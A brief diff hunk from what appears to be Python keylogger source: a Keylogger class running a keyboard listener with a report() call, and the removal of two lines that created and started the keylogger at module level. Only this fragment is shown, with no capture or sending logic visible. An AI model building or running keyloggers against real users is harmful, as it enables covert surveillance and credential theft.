@@ -27,5 +27,3 @@ class Keylogger:
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
-my_keylogger = keylogger.Keylogger()
-my_keylogger.start()
